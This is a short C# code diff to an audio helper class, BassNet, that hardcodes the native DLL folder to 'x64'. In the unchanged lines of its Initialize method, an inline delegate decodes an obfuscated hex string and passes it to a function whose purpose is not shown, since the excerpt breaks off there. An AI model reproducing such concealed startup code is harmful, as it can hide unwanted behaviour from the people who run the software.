@@ -9,6 +9,8 @@ namespace Ribbit.Media.Audio;
 
 public static class BassNet
 {
+    private const string NativeArchitectureDirectoryName = "x64";
+
     private static bool _isInitialized;
 
     public static void Initialize()
@@ -18,7 +20,7 @@ public static class BassNet
             throw new InvalidOperationException("BassNet is already initialized or used.");
         }
         string[] fileNames = ["bass.dll", "bassasio.dll", "basswasapi.dll", "bassmix.dll", "bass_fx.dll", "bassenc.dll"];
-        DllLoader.LoadAllLybraries(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "libs", Environment.Is64BitProcess ? "x64" : "x86"), fileNames);
+        DllLoader.LoadAllLybraries(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "libs", NativeArchitectureDirectoryName), fileNames);
         ((Action<Action<string, string>, string, string>)delegate (Action<string, string> f, string i, string j)
         {
             f(new string([.. (from n in "d7cbxdba4x22b9xd7daxdf35xd7cexdf3fxd7caxdc65xd7d8xdc43xd7d2xdc78x2689xd7dcxdbbcxd7d8xdca8xd7d6xdbddxd7dcxdddexd7d0xded6xd7d9xdf53xd7d0".Split('x')
